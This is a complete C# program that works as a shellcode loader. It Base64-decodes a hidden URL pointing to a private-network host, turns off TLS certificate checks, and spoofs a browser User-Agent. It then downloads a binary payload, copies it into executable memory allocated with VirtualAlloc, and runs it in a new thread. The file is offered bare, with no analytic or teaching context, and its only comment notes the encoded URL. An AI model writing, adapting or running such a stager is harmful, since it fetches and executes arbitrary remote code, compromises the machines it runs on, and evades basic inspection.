using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern uint GetLastError();

    static void Main()
    {
        string encodedUrl = "aHR0cHM6Ly8xOTIuMTY4LjAuMTAyLzQuYmlu"; // URL codificada en Base64

        ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

        using (WebClient client = new WebClient())
        {
            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
                        
            string url = Encoding.UTF8.GetString(Convert.FromBase64String(encodedUrl));

            byte[] binData = client.DownloadData(url);

            
            IntPtr codePointer = VirtualAlloc(IntPtr.Zero, (uint)binData.Length, 0x1000, 0x40);

            Marshal.Copy(binData, 0, codePointer, binData.Length);

            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, codePointer, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(threadHandle, 0xFFFFFFFF);

            VirtualFree(codePointer, 0, 0x8000);
        }
    }
}
